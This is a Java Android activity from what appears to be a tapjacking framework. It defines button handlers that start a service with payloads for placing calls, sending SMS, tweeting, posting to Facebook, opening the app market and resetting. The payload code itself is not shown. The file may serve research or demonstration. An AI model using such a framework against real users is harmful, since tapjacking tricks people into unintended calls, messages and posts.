package com.tapjacking.framework;

import com.tapjacking.framework.R;
import com.tapjacking.payloads.CallPayload;
import com.tapjacking.payloads.FacebookPayload;
import com.tapjacking.payloads.MarketPayload;
import com.tapjacking.payloads.ResetPayload;
import com.tapjacking.payloads.SMSPayload;
import com.tapjacking.payloads.TweetPayload;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.view.View;

public class Main extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    }

    public void callPayload(View v) {
    	FrameworkService.setLoad(new CallPayload());
		startService(new Intent(FrameworkService.class.getName()));
    }

    public void resetPayload(View v) {
    	FrameworkService.setLoad(new ResetPayload());
    	startService(new Intent(FrameworkService.class.getName()));
    }

    public void smsPayload(View v) {
    	FrameworkService.setLoad(new SMSPayload());
    	startService(new Intent(FrameworkService.class.getName()));
    }

    public void tweetPayload(View v) {
    	FrameworkService.setLoad(new TweetPayload());
    	startService(new Intent(FrameworkService.class.getName()));
    }

    public void marketPayload(View v) {
    	FrameworkService.setLoad(new MarketPayload());
    	startService(new Intent(FrameworkService.class.getName()));
    }

    public void facebookPayload(View v) {
    	FrameworkService.setLoad(new FacebookPayload());
    	startService(new Intent(FrameworkService.class.getName()));
    }
}
